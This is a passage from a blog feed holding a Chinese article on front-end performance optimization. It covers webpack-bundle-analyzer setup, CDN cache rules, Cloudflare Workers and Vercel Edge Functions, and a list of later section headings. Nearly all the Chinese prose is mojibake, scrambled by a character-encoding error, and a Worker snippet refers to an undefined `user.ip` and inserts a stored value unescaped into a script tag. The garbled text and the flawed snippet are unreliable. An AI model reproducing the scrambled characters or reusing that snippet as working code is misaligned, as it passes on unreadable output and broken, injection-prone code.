é¡¹ç›®</li><li>é¢‘ç¹çƒ­æ›´æ–°çš„å¼€å‘ç¯å¢ƒ</li></ul></li><li>é™åˆ¶ï¼š<ul><li>ä¸æ”¯æŒ IE11 ç­‰æ—§æµè§ˆå™¨ï¼ˆéœ€æ’ä»¶ @vitejs&#x2F;plugin-legacyï¼‰</li><li>æ·±åº¦å®šåˆ¶æ„å»ºéœ€å­¦ä¹  Rollup API</li></ul></li></ul><h3 id="Bundle-åˆ†æå·¥å…·ï¼šWebpack-bundle-analyzer"><a href="#Bundle-åˆ†æå·¥å…·ï¼šWebpack-bundle-analyzer" class="headerlink" title="Bundle åˆ†æå·¥å…·ï¼šWebpack-bundle-analyzer"></a>Bundle åˆ†æå·¥å…·ï¼šWebpack-bundle-analyzer</h3><p><strong>æ ¸å¿ƒåŠŸèƒ½</strong></p><p>(1) å¯è§†åŒ–åˆ†æï¼š</p><ul><li>ç”Ÿæˆäº¤äº’å¼æ ‘çŠ¶å›¾ï¼ˆTreemapï¼‰å±•ç¤ºæ‰€æœ‰è¾“å‡ºæ–‡ä»¶</li><li>æŒ‰æ¨¡å—&#x2F;åŒ…(package)å±•ç¤ºç‰©ç†ä½“ç§¯ï¼ˆgzipå‰ï¼‰å’Œå æ¯”</li></ul><pre class="mermaid">graph TD  A[å…¥å£æ–‡ä»¶] --> B[react-dom]  A --> C[lodash-es]  A --> D[ä¸šåŠ¡ç»„ä»¶]  D --> D1[Header.jsx]  D --> D2[ProductList.ts]</pre><p>(2) å…³é”®æ´å¯Ÿç»´åº¦ï¼š</p><ul><li>æ¨¡å—ä½“ç§¯æ’åï¼ˆæ‰¾å‡ºæœ€å¤§æ¨¡å—ï¼‰</li><li>é‡å¤ä¾èµ–æ£€æµ‹ï¼ˆåŒä¸€åŒ…è¢«å¤šæ¬¡æ‰“åŒ…ï¼‰</li><li>ä»£ç åˆ†å‰²æ•ˆæœéªŒè¯</li><li>ç¬¬ä¸‰æ–¹ä¾èµ–ï¼ˆnode_modulesï¼‰å æ¯”</li></ul><p><strong>å·¥ä½œåŸç†</strong></p><pre class="mermaid">sequenceDiagram  participant Webpack  participant Plugin  participant Browser    Webpack->>Plugin: æ„å»ºå®Œæˆåè§¦å‘é’©å­  Plugin->>Plugin: æ”¶é›†stats.jsonæ•°æ®  Plugin->>Plugin: ç”Ÿæˆåˆ†ææŠ¥å‘ŠHTML  Plugin->>Browser: è‡ªåŠ¨æ‰“å¼€127.0.0.1:8888  Browser->>Plugin: è¯·æ±‚æŠ¥å‘Šæ•°æ®  Plugin->>Browser: è¿”å›äº¤äº’å¼å¯è§†åŒ–é¡µé¢</pre><p><strong>é…ç½®ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack-bundle-analyzer&#x27;</span>)<br> .<span class="hljs-property">BundleAnalyzerPlugin</span>;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span>(&#123;<br>      <span class="hljs-attr">analyzerMode</span>: <span class="hljs-string">&#x27;server&#x27;</span>, <span class="hljs-comment">// å¯åŠ¨æœ¬åœ°æœåŠ¡æŸ¥çœ‹</span><br>      <span class="hljs-attr">openAnalyzer</span>: <span class="hljs-literal">true</span>,     <span class="hljs-comment">// æ„å»ºå®Œæˆåè‡ªåŠ¨æ‰“å¼€</span><br>      <span class="hljs-attr">reportFilename</span>: <span class="hljs-string">&#x27;report.html&#x27;</span> <span class="hljs-comment">// è‡ªå®šä¹‰æŠ¥å‘Šæ–‡ä»¶å</span><br>    &#125;)<br>  ]<br>&#125;;<br><br><span class="hljs-comment">// é«˜çº§å‚æ•°</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span>(&#123;<br>  <span class="hljs-attr">analyzerPort</span>: <span class="hljs-number">3000</span>,              <span class="hljs-comment">// è‡ªå®šä¹‰ç«¯å£</span><br>  <span class="hljs-attr">defaultSizes</span>: <span class="hljs-string">&#x27;parsed&#x27;</span>,          <span class="hljs-comment">// æ˜¾ç¤ºè§£æåå¤§å°</span><br>  <span class="hljs-attr">excludeAssets</span>: <span class="hljs-regexp">/\.map$/</span>,         <span class="hljs-comment">// æ’é™¤sourcemap</span><br>  <span class="hljs-attr">statsOptions</span>: &#123;<br>    <span class="hljs-attr">excludeModules</span>: <span class="hljs-regexp">/node_modules\/core-js/</span> <span class="hljs-comment">// æ’é™¤ç‰¹å®šæ¨¡å—</span><br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p><strong>åˆ†ææŠ¥å‘Šè§£è¯» - å…³é”®åŒºåŸŸè¯´æ˜</strong></p><table><thead><tr><th align="left">åŒºåŸŸ</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">çŸ©å½¢å¤§å°</td><td align="left">æ¨¡å—ç‰©ç†ä½“ç§¯ï¼ˆégzipï¼‰</td></tr><tr><td align="left">é¢œè‰²æ·±åº¦</td><td align="left">æ–‡ä»¶æ•°é‡ï¼ˆè¶Šæ·±æ–‡ä»¶è¶Šå¤šï¼‰</td></tr><tr><td align="left">æ‚¬åœæç¤º</td><td align="left">æ˜¾ç¤ºç²¾ç¡®å¤§å°å’Œè·¯å¾„</td></tr><tr><td align="left">å·¦ä¸Šè§’ç­›é€‰å™¨</td><td align="left">æŒ‰å…¥å£&#x2F;æ–‡ä»¶ç±»å‹è¿‡æ»¤</td></tr></tbody></table><h2 id="5-2-CDNä¸è¾¹ç¼˜è®¡ç®—"><a href="#5-2-CDNä¸è¾¹ç¼˜è®¡ç®—" class="headerlink" title="5.2 CDNä¸è¾¹ç¼˜è®¡ç®—"></a>5.2 CDNä¸è¾¹ç¼˜è®¡ç®—</h2><h3 id="è¾¹ç¼˜ç¼“å­˜ç­–ç•¥ï¼ˆCDN-Cache-Rulesï¼‰"><a href="#è¾¹ç¼˜ç¼“å­˜ç­–ç•¥ï¼ˆCDN-Cache-Rulesï¼‰" class="headerlink" title="è¾¹ç¼˜ç¼“å­˜ç­–ç•¥ï¼ˆCDN Cache Rulesï¼‰"></a>è¾¹ç¼˜ç¼“å­˜ç­–ç•¥ï¼ˆCDN Cache Rulesï¼‰</h3><p><strong>æ ¸å¿ƒæ¦‚å¿µä¸ä»·å€¼</strong></p><p>(1) CDN è¾¹ç¼˜èŠ‚ç‚¹ï¼š</p><ul><li>å…¨çƒåˆ†å¸ƒçš„æœåŠ¡å™¨èŠ‚ç‚¹ï¼ˆé€šå¸¸1000+ï¼‰</li><li>ç‰©ç†ä½ç½®é è¿‘ç»ˆç«¯ç”¨æˆ·</li><li>ç¤ºä¾‹æ‹“æ‰‘ï¼š</li></ul><pre class="mermaid">graph LR  User[åŒ—äº¬ç”¨æˆ·] --> |10ms| BJ[åŒ—äº¬CDNèŠ‚ç‚¹]  User --> |150ms| NY[çº½çº¦æºç«™]  BJ --> |40ms| SH[ä¸Šæµ·æºç«™]</pre><p>(2) ç¼“å­˜ç­–ç•¥ç›®æ ‡ï¼š</p><ul><li>åŠ é€Ÿå†…å®¹åˆ†å‘ï¼ˆé™ä½å»¶è¿Ÿï¼‰</li><li>å‡å°‘æºç«™å¸¦å®½æˆæœ¬</li><li>ç¼“è§£æºç«™å‹åŠ›ï¼ˆé˜²DDoSï¼‰</li></ul><p><strong>ç¼“å­˜è§„åˆ™æ ¸å¿ƒé…ç½®ç»´åº¦</strong></p><table><thead><tr><th align="left">é…ç½®ç»´åº¦</th><th align="left">å…³é”®å‚æ•°</th><th align="left">å…¸å‹å€¼ç¤ºä¾‹</th><th align="left">ä½œç”¨è¯´æ˜</th></tr></thead><tbody><tr><td align="left">ç¼“å­˜é”®</td><td align="left">Cache-Key</td><td align="left">$uri-$query-$cookie</td><td align="left">å®šä¹‰èµ„æºå”¯ä¸€æ ‡è¯†</td></tr><tr><td align="left">ç¼“å­˜æ—¶é—´</td><td align="left">Cache-Control: max-age</td><td align="left">max-age&#x3D;31536000</td><td align="left">é™æ€èµ„æºè®¾ç½®1å¹´ç¼“å­˜</td></tr><tr><td align="left">ç¼“å­˜å±‚çº§</td><td align="left">CDN-Cache-Level</td><td align="left">L1&#x2F;L2</td><td align="left">æ§åˆ¶è¾¹ç¼˜&#x2F;ä¸­é—´å±‚ç¼“å­˜</td></tr><tr><td align="left">ç¼“å­˜è¡Œä¸º</td><td align="left">X-Cache</td><td align="left">HIT&#x2F;MISS&#x2F;BYPASS</td><td align="left">æ˜¾ç¤ºç¼“å­˜å‘½ä¸­çŠ¶æ€</td></tr><tr><td align="left">ç¼“å­˜æ¸…é™¤</td><td align="left">Purge-API</td><td align="left">POST &#x2F;purge&#x2F;{url}</td><td align="left">ä¸»åŠ¨å¤±æ•ˆç¼“å­˜</td></tr></tbody></table><p><strong>ç¼“å­˜ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong></p><pre class="mermaid">sequenceDiagram  participant Client  participant CDN  participant Origin    Client->>CDN: è¯·æ±‚ /main.js  alt é¦–æ¬¡è¯·æ±‚    CDN->>Origin: MISS (å›æºè·å–)    Origin->>CDN: 200 OK + Cache-Control: max-age=3600    CDN->>Client: è¿”å›èµ„æº (å­˜å‚¨ç¼“å­˜)  else ç¼“å­˜æœ‰æ•ˆ    CDN->>Client: HIT (ç›´æ¥è¿”å›)  else ç¼“å­˜è¿‡æœŸ    CDN->>Origin: If-Modified-Since    alt å†…å®¹æœªå˜      Origin->>CDN: 304 Not Modified      CDN->>Client: HIT (æ›´æ–°æœ‰æ•ˆæœŸ)    else å†…å®¹å·²å˜      Origin->>CDN: 200 OK (æ–°å†…å®¹)      CDN->>Client: è¿”å›æ–°èµ„æº    end  end</pre><h3 id="è¾¹ç¼˜å‡½æ•°ï¼šCloudflare-Workers-Vercel-Edge-Functions"><a href="#è¾¹ç¼˜å‡½æ•°ï¼šCloudflare-Workers-Vercel-Edge-Functions" class="headerlink" title="è¾¹ç¼˜å‡½æ•°ï¼šCloudflare Workers &#x2F; Vercel Edge Functions"></a>è¾¹ç¼˜å‡½æ•°ï¼šCloudflare Workers &#x2F; Vercel Edge Functions</h3><p><strong>æ ¸å¿ƒæ¦‚å¿µä¸æ¶æ„æ¼”è¿›</strong></p><pre class="mermaid">graph TB  A[ä¼ ç»Ÿæ¶æ„] --> B[å®¢æˆ·ç«¯è¯·æ±‚]  B --> C[äº‘æœåŠ¡å™¨]  C --> D[æ•°æ®åº“]  D --> C  C --> B    E[è¾¹ç¼˜è®¡ç®—æ¶æ„] --> F[å®¢æˆ·ç«¯è¯·æ±‚]  F --> G[è¾¹ç¼˜èŠ‚ç‚¹]  G --> H[è¾¹ç¼˜å‡½æ•°æ‰§è¡Œ]  H -->|ç›´æ¥å“åº”| F  H -->|å¿…è¦æ•°æ®| I[è¾¹ç¼˜ç¼“å­˜/æ•°æ®åº“]</pre><p>æŠ€æœ¯å®šä¹‰ï¼š</p><ul><li>è¾¹ç¼˜å‡½æ•°ï¼šåœ¨å…¨çƒåˆ†å¸ƒå¼CDNèŠ‚ç‚¹ä¸Šè¿è¡Œçš„JavaScript&#x2F;WASMå‡½æ•°</li><li>æ‰§è¡Œä½ç½®ï¼šè·ç¦»ç”¨æˆ·æœ€è¿‘çš„ç½‘ç»œè¾¹ç¼˜èŠ‚ç‚¹ï¼ˆé€šå¸¸&lt;50msï¼‰</li><li>æ ¸å¿ƒä»·å€¼ï¼š<ul><li>è¶…ä½å»¶è¿Ÿå“åº”ï¼ˆå‡å°‘å¾€è¿”æºç«™æ—¶é—´ï¼‰</li><li>å…¨çƒåˆ†å¸ƒå¼æ‰§è¡Œ</li><li>é›¶æœåŠ¡å™¨è¿ç»´</li></ul></li></ul><p><strong>å·¥ä½œåŸç†</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">Cloudflare Workers</th><th align="left">Vercel Edge Functions</th></tr></thead><tbody><tr><td align="left">è¿è¡Œæ—¶</td><td align="left">V8 Isolates (Chromeå¼•æ“)</td><td align="left">V8 Isolates</td></tr><tr><td align="left">ç¼–ç¨‹è¯­è¨€</td><td align="left">JavaScript&#x2F;WASM&#x2F;Rust</td><td align="left">JavaScript&#x2F;TypeScript</td></tr><tr><td align="left">éƒ¨ç½²å•ä½</td><td align="left">å•ä¸ªè„šæœ¬ (.js&#x2F;.ts)</td><td align="left">å‡½æ•°æ–‡ä»¶ (&#x2F;api&#x2F;*.ts)</td></tr><tr><td align="left">è§¦å‘å™¨</td><td align="left">æ‰€æœ‰HTTPè¯·æ±‚</td><td align="left">æŒ‰è·¯ç”±åŒ¹é…çš„è¯·æ±‚</td></tr><tr><td align="left">æœ¬åœ°å¼€å‘</td><td align="left">wrangler dev</td><td align="left">vercel dev</td></tr><tr><td align="left">æŒä¹…å­˜å‚¨</td><td align="left">Workers KV &#x2F; D1 &#x2F; R2</td><td align="left">Vercel KV &#x2F; Postgres Edge</td></tr></tbody></table><p><strong>æ ¸å¿ƒåº”ç”¨åœºæ™¯</strong></p><p>(1) åŠ¨æ€å†…å®¹ä¼˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Cloudflare Workerç¤ºä¾‹ï¼šä¸ªæ€§åŒ–å†…å®¹æ³¨å…¥</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-params">request</span>) &#123;<br>    <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(request.<span class="hljs-property">url</span>)<br>    <br>    <span class="hljs-comment">// ä»è¾¹ç¼˜KVè¯»å–ç”¨æˆ·åå¥½</span><br>    <span class="hljs-keyword">const</span> pref = <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">KV</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">`pref:<span class="hljs-subst">$&#123;user.ip&#125;</span>`</span>, <span class="hljs-string">&#x27;json&#x27;</span>)<br>    <br>    <span class="hljs-comment">// ä¿®æ”¹HTMLå“åº”</span><br>    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url)<br>    <span class="hljs-keyword">const</span> html = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">text</span>()<br>    <span class="hljs-keyword">const</span> newHtml = html.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;&lt;/body&gt;&#x27;</span>, <span class="hljs-string">`&lt;script&gt;THEME=<span class="hljs-subst">$&#123;pref.theme&#125;</span>&lt;/script&gt;&lt;/body&gt;`</span>)<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(newHtml, res)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å®‰å…¨é˜²æŠ¤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Cloudflare Workerï¼šAPIæ”»å‡»é˜²æŠ¤</span><br><span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> request = event.<span class="hljs-property">request</span><br>  <span class="hljs-keyword">const</span> ip = request.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;CF-Connecting-IP&#x27;</span>)<br>  <br>  <span class="hljs-comment">// æ£€æŸ¥IPä¿¡èª‰åº“</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isMaliciousIP</span>(ip)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">&#x27;Blocked&#x27;</span>, &#123; <span class="hljs-attr">status</span>: <span class="hljs-number">403</span> &#125;)<br>  &#125;<br>  <br>  <span class="hljs-comment">// éªŒè¯JWTä»¤ç‰Œ</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">validateToken</span>(request)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">&#x27;Unauthorized&#x27;</span>, &#123; <span class="hljs-attr">status</span>: <span class="hljs-number">401</span> &#125;)<br>  &#125;<br>  <br>  event.<span class="hljs-title function_">respondWith</span>(<span class="hljs-title function_">handleRequest</span>(request))<br>&#125;)<br></code></pre></td></tr></table></figure><p><strong>å¼€å‘éƒ¨ç½²æµç¨‹</strong></p><pre class="mermaid">flowchart LR  A[ä»£ç å¼€å‘] --> B[æœ¬åœ°æµ‹è¯•]  B --> C[wrangler publish]  C --> D[å…¨çƒéƒ¨ç½²]  D --> E[è‡ªåŠ¨æµé‡åˆ‡æ¢]  E --> F[å®æ—¶ç›‘æ§]</pre><p>å…¸å‹éƒ¨ç½²å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…CLI</span><br>npm install -g wrangler<br><br><span class="hljs-comment"># ç™»å½•è®¤è¯</span><br>wrangler login<br><br><span class="hljs-comment"># å‘å¸ƒWorker</span><br>wrangler publish src/index.js<br></code></pre></td></tr></table></figure><p><strong>å…¸å‹åº”ç”¨æ¶æ„</strong></p><pre class="mermaid">graph LR  A[å®¢æˆ·ç«¯] --> B[è¾¹ç¼˜èŠ‚ç‚¹]  B --> C{è·¯ç”±åˆ¤æ–­}  C -->|é™æ€èµ„æº| D[è¾¹ç¼˜ç¼“å­˜]  C -->|APIè¯·æ±‚| E[è¾¹ç¼˜å‡½æ•°]  E --> F[è¾¹ç¼˜KVæ•°æ®åº“]  E --> G[è¾¹ç¼˜SQLite]  E -->|å¤æ‚æŸ¥è¯¢| H[ä¼ ç»Ÿäº‘æ•°æ®åº“]  D & E --> A</pre><h1 id="å…­ã€è¿›é˜¶åœºæ™¯ä¼˜åŒ–"><a href="#å…­ã€è¿›é˜¶åœºæ™¯ä¼˜åŒ–" class="headerlink" title="å…­ã€è¿›é˜¶åœºæ™¯ä¼˜åŒ–"></a>å…­ã€è¿›é˜¶åœºæ™¯ä¼˜åŒ–</h1><h2 id="6-1-ç§»åŠ¨ç«¯ä¸“é¡¹"><a href="#6-1-ç§»åŠ¨ç«¯ä¸“é¡¹" class="headerlink" title="6.1 ç§»åŠ¨ç«¯ä¸“é¡¹"></a>6.1 ç§»åŠ¨ç«¯ä¸“é¡¹</h2><h3 id="é¦–å±ç§’å¼€æ–¹æ¡ˆï¼šç¦»çº¿åŒ…ã€é¢„è¯·æ±‚ã€VAPï¼ˆè§†è§‰åŠ¨ç”»è¿›åº¦ï¼‰"><a href="#é¦–å±ç§’å¼€æ–¹æ¡ˆï¼šç¦»çº¿åŒ…ã€é¢„è¯·æ±‚ã€VAPï¼ˆè§†è§‰åŠ¨ç”»è¿›åº¦ï¼‰" class="headerlink" title="é¦–å±ç§’å¼€æ–¹æ¡ˆï¼šç¦»çº¿åŒ…ã€é¢„è¯·æ±‚ã€VAPï¼ˆè§†è§‰åŠ¨ç”»è¿›åº¦ï¼‰"></a>é¦–å±ç§’å¼€æ–¹æ¡ˆï¼šç¦»çº¿åŒ…ã€é¢„è¯·æ±‚ã€VAPï¼ˆè§†è§‰åŠ¨ç”»è¿›åº¦ï¼‰</h3><h3 id="æ‰‹åŠ¿æ€§èƒ½ä¼˜åŒ–ï¼ˆé¿å…é˜»å¡æ»šåŠ¨ï¼‰"><a href="#æ‰‹åŠ¿æ€§èƒ½ä¼˜åŒ–ï¼ˆé¿å…é˜»å¡æ»šåŠ¨ï¼‰" class="headerlink" title="æ‰‹åŠ¿æ€§èƒ½ä¼˜åŒ–ï¼ˆé¿å…é˜»å¡æ»šåŠ¨ï¼‰"></a>æ‰‹åŠ¿æ€§èƒ½ä¼˜åŒ–ï¼ˆé¿å…é˜»å¡æ»šåŠ¨ï¼‰</h3><h2 id="6-2-å¤æ‚åŠ¨ç”»æ€§èƒ½"><a href="#6-2-å¤æ‚åŠ¨ç”»æ€§èƒ½" class="headerlink" title="6.2 å¤æ‚åŠ¨ç”»æ€§èƒ½"></a>6.2 å¤æ‚åŠ¨ç”»æ€§èƒ½</h2><h3 id="CSSåŠ¨ç”»-vs-JSåŠ¨ç”»ï¼ˆRAFï¼‰"><a href="#CSSåŠ¨ç”»-vs-JSåŠ¨ç”»ï¼ˆRAFï¼‰" class="headerlink" title="CSSåŠ¨ç”» vs JSåŠ¨ç”»ï¼ˆRAFï¼‰"></a>CSSåŠ¨ç”» vs JSåŠ¨ç”»ï¼ˆRAFï¼‰</h3><h3 id="FLIPåŠ¨ç”»æŠ€æœ¯ï¼ˆFirst-Last-Invert-Playï¼‰"><a href="#FLIPåŠ¨ç”»æŠ€æœ¯ï¼ˆFirst-Last-Invert-Playï¼‰" class="headerlink" title="FLIPåŠ¨ç”»æŠ€æœ¯ï¼ˆFirst, Last, Invert, Playï¼‰"></a>FLIPåŠ¨ç”»æŠ€æœ¯ï¼ˆFirst, Last, Invert, Playï¼‰</h3><h2 id="6-3-ä½ç«¯è®¾å¤‡é€‚é…"><a href="#6-3-ä½ç«¯è®¾å¤‡é€‚é…" class="headerlink" title="6.3 ä½ç«¯è®¾å¤‡é€‚é…"></a>6.3 ä½ç«¯è®¾å¤‡é€‚é…</h2><h3 id="ä»£ç é™çº§ç­–ç•¥ï¼ˆDynamic-Polyfillï¼‰"><a href="#ä»£ç é™çº§ç­–ç•¥ï¼ˆDynamic-Polyfillï¼‰" class="headerlink" title="ä»£ç é™çº§ç­–ç•¥ï¼ˆDynamic Polyfillï¼‰"></a>ä»£ç é™çº§ç­–ç•¥ï¼ˆDynamic Polyfillï¼‰</h3><h3 id="å†…å­˜å ç”¨é‡æ§åˆ¶ï¼ˆ-100MBï¼‰"><a href="#å†…å­˜å ç”¨é‡æ§åˆ¶ï¼ˆ-100MBï¼‰" class="headerlink" title="å†…å­˜å ç”¨é‡æ§åˆ¶ï¼ˆ&lt; 100MBï¼‰"></a>å†…å­˜å ç”¨é‡æ§åˆ¶ï¼ˆ&lt; 100MBï¼‰</h3><h1 id="ä¸ƒã€æ€§èƒ½ä¼˜åŒ–æµç¨‹"><a href="#ä¸ƒã€æ€§èƒ½ä¼˜åŒ–æµç¨‹" class="headerlink" title="ä¸ƒã€æ€§èƒ½ä¼˜åŒ–æµç¨‹"></a>ä¸ƒã€æ€§èƒ½ä¼˜åŒ–æµç¨‹</h1><h2 id="7-1-æ€§èƒ½å®¡è®¡æ–¹æ³•è®º"><a href="#7-1-æ€§èƒ½å®¡è®¡æ–¹æ³•è®º" class="headerlink" title="7.1 æ€§èƒ½å®¡è®¡æ–¹æ³•è®º"></a>7.1 æ€§èƒ½å®¡è®¡æ–¹æ³•è®º</h2><h3 id="åˆ¶å®šæ€§èƒ½é¢„ç®—ï¼ˆPerformance-Budgetï¼‰"><a href="#åˆ¶å®šæ€§èƒ½é¢„ç®—ï¼ˆPerformance-Budgetï¼‰" class="headerlink" title="åˆ¶å®šæ€§èƒ½é¢„ç®—ï¼ˆPerformance Budgetï¼‰"></a>åˆ¶å®šæ€§èƒ½é¢„ç®—ï¼ˆPerformance Budgetï¼‰</h3><h3 id="RAILæ¨¡å‹ï¼ˆResponse-Animation-Idle-Loadï¼‰"><a href="#RAILæ¨¡å‹ï¼ˆResponse-Animation-Idle-Loadï¼‰" class="headerlink" title="RAILæ¨¡å‹ï¼ˆResponse, Animation, Idle, Loadï¼‰"></a>RAILæ¨¡å‹ï¼ˆResponse, Animation, Idle, Loadï¼‰</h3><h2 id="7-2-ç°åº¦ä¸åº¦é‡"><a href="#7-2-ç°åº¦ä¸åº¦é‡" class="headerlink" title="7.2 ç°åº¦ä¸åº¦é‡"></a>7.2 ç°åº¦ä¸åº¦é‡</h2><h3 id="A-Bæµ‹è¯•æ€§èƒ½æ–¹æ¡ˆ"><a href="#A-Bæµ‹è¯•æ€§èƒ½æ–¹æ¡ˆ" class="headerlink" title="A&#x2F;Bæµ‹è¯•æ€§èƒ½æ–¹æ¡ˆ"></a>A&#x2F;Bæµ‹è¯•æ€§èƒ½æ–¹æ¡ˆ</h3><h3 id="æ€§èƒ½æŒ‡æ ‡è‡ªåŠ¨åŒ–æŠ¥è­¦"><a href="#æ€§èƒ½æŒ‡æ ‡è‡ªåŠ¨åŒ–æŠ¥è­¦" class="headerlink" title="æ€§èƒ½æŒ‡æ ‡è‡ªåŠ¨åŒ–æŠ¥è­¦"></a>æ€§èƒ½æŒ‡æ ‡è‡ªåŠ¨åŒ–æŠ¥è­¦</h3><h1 id="å…«ã€æ–°å…´æŠ€æœ¯æ–¹å‘"><a href="#å…«ã€æ–°å…´æŠ€æœ¯æ–¹å‘" class="headerlink" title="å…«ã€æ–°å…´æŠ€æœ¯æ–¹å‘"></a>å…«ã€æ–°å…´æŠ€æœ¯æ–¹å‘</h1><h2 id="8-1-ç°ä»£æµè§ˆå™¨API"><a href="#8-1-ç°ä»£æµè§ˆå™¨API" class="headerlink" title="8.1 ç°ä»£æµè§ˆå™¨API"></a>8.1 ç°ä»£æµè§ˆå™¨API</h2><h3 id="IntersectionObserver-æ‡’åŠ è½½"><a href="#IntersectionObserver-æ‡’åŠ è½½" class="headerlink" title="IntersectionObserver æ‡’åŠ è½½"></a>IntersectionObserver æ‡’åŠ è½½</h3><h3 id="ResizeObserver-æ›¿ä»£æ»šåŠ¨ç›‘å¬"><a href="#ResizeObserver-æ›¿ä»£æ»šåŠ¨ç›‘å¬" class="headerlink" title="ResizeObserver æ›¿ä»£æ»šåŠ¨ç›‘å¬"></a>ResizeObserver æ›¿ä»£æ»šåŠ¨ç›‘å¬</h3><h3 id="Priority-Hints-å®éªŒæ€§"><a href="#Priority-Hints-å®éªŒæ€§" class="headerlink" title="Priority Hints (å®éªŒæ€§)"></a>Priority Hints (å®éªŒæ€§)</h3><h2 id="8-2-Webæ€§èƒ½æ ‡å‡†æ¼”è¿›"><a href="#8-2-Webæ€§èƒ½æ ‡å‡†æ¼”è¿›" class="headerlink" title="8.2 Webæ€§èƒ½æ ‡å‡†æ¼”è¿›"></a>8.2 Webæ€§èƒ½æ ‡å‡†æ¼”è¿›</h2><h3 id="WebAssembly-é«˜æ€§èƒ½æ¨¡å—"><a href="#WebAssembly-é«˜æ€§èƒ½æ¨¡å—" class="headerlink" title="WebAssembly é«˜æ€§èƒ½æ¨¡å—"></a>WebAssembly é«˜æ€§èƒ½æ¨¡å—</h3><h3 id="WebGPU-å›¾å½¢è®¡ç®—åŠ é€Ÿ"><a href="#WebGPU-å›¾å½¢è®¡ç®—åŠ é€Ÿ" class="headerlink" title="WebGPU å›¾å½¢è®¡ç®—åŠ é€Ÿ"></a>WebGPU å›¾å½¢è®¡ç®—åŠ é€Ÿ</h3>]]></content>
    
    
    <categories>
      
      <category>æ€§èƒ½ä¼˜åŒ–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ€§èƒ½ä¼˜åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>React çŸ¥è¯†ä½“ç³»ä¸“é¢˜å­¦ä¹ </title>
    <link href="/2025/06/23/React%20Study%20Notes/"/>
    <url>/2025/06/23/React%20Study%20Notes/</url>
    
